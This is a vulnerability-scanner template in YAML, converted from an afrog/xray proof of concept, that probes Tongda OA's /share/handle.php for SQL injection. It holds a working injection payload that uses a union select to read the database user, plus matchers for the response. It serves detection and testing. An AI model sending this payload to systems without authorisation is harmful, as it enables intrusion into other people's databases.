# 来源: afrog（转换自 afrog/xray 表达式 POC）
http:
  - matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - '"status":'
          - '"short_url":'
          - '"img_url":'
        condition: and
    method: GET
    path:
      - '{{BaseURL}}/share/handle.php?_GET[module]=1%27+and+1={`=%27`+1}+and+1=0+union+select+(select/**/user())--+%27'
id: tongda-handle-sqli
info:
  author: zan8in
  description: ""
  metadata:
    argus-execution-class: detection
    argus-import-license: MIT License
    argus-import-source: afrog
    argus-risk-level: high
  name: 通达OA handle SQL注入
  severity: high
  tags: tongda,oa,sqli,argus-import
